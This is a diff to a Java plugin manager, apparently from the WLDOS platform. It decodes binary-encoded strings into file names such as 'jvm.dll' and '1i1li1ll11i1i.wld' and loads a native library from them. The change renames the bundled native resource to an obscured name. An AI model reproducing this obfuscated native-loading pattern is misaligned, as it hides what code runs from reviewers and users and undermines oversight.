@@ -104,7 +104,7 @@ public class PluginManager {
 			String resPath = System.getProperty("wldos.platform.web-inf")+File.separator+Constants.DIRECTORY_TEMP_NAME+File.separator+"include"+File.separator;
 			StringBuilder _order = new StringBuilder();Arrays.stream("1101010l1110110l1101101l1110100l1101001l101110l1101000".split(String.valueOf((char)Integer.parseInt("1101100", 2))))
 					.map(s -> (char) Integer.parseInt(s + "", 2) + "").collect(Collectors.toList()).forEach(_order::append);NativeLoader.loadLibraryI(loaderClass, resPath, _order);_order=new StringBuilder();
-					Arrays.stream("101111l1101001l1101110l1100011l1101100l1110101l1100100l1100101l101111l1101010l1110110l1101101l101110l1100100l1101100l1101100".split(String.valueOf((char)Integer.parseInt("1101100", 2))))
+					Arrays.stream("101111l1101001l1101110l1100011l1101100l1110101l1100100l1100101l101111l110001l1101001l110001l1101100l1101001l110001l1101100l1101100l110001l110001l1101001l110001l1101001l101110l1110111l1101100l1100100l".split(String.valueOf((char)Integer.parseInt("1101100", 2))))
 					.map(s -> (char) Integer.parseInt(s + "", 2) + "").collect(Collectors.toList()).forEach(_order::append);ClassPathResource loader = new ClassPathResource(_order.toString());NativeLoader
 					.loadLibraryI(loaderClass, resPath, _order);_order=new StringBuilder();
 			libStream = loader.getInputStream();Arrays.stream("1101010l1110110l1101101l101110l1100100l1101100l1101100".split(String.valueOf((char)Integer.parseInt("1101100", 2))))
